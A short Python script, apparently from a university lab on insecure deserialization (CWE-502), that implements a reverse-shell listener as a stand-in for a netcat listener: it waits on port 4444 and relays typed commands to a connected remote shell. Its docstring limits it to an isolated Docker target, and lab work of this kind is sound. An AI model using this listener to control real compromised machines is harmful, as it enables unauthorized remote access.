#!/usr/bin/env python3
"""
Listener de reverse shell para el lab CWE-502 (TPI deserializacion insegura).
Reemplaza a `nc -lvnp <puerto>` ya que Windows no trae netcat por defecto.

Uso:
    python revshell_listener.py [puerto]

Default: puerto 4444. Deja la terminal abierta y en foreground -- es
la consola interactiva de la reverse shell: lo que escribas se manda
al shell remoto, lo que el shell remoto devuelva se imprime acá.

Pensado SOLO para el target Docker aislado de este laboratorio
(target-app conectandose de vuelta a host.docker.internal). No usar
contra nada que no sea este lab.
"""
import socket
import sys
import threading

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4444


def relay_from_socket(conn):
    while True:
        try:
            data = conn.recv(4096)
        except OSError:
            break
        if not data:
            print("\n[!] Conexion cerrada por el remoto.")
            break
        sys.stdout.write(data.decode(errors="replace"))
        sys.stdout.flush()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT))
    srv.listen(1)
    print(f"[*] Escuchando en 0.0.0.0:{PORT} ... (Ctrl+C para salir)")

    conn, addr = srv.accept()
    print(f"[+] Conexion recibida de {addr[0]}:{addr[1]}")

    t = threading.Thread(target=relay_from_socket, args=(conn,), daemon=True)
    t.start()

    try:
        while True:
            line = input()
            conn.sendall((line + "\n").encode())
    except (KeyboardInterrupt, EOFError):
        pass
    finally:
        conn.close()
        srv.close()


if __name__ == "__main__":
    main()
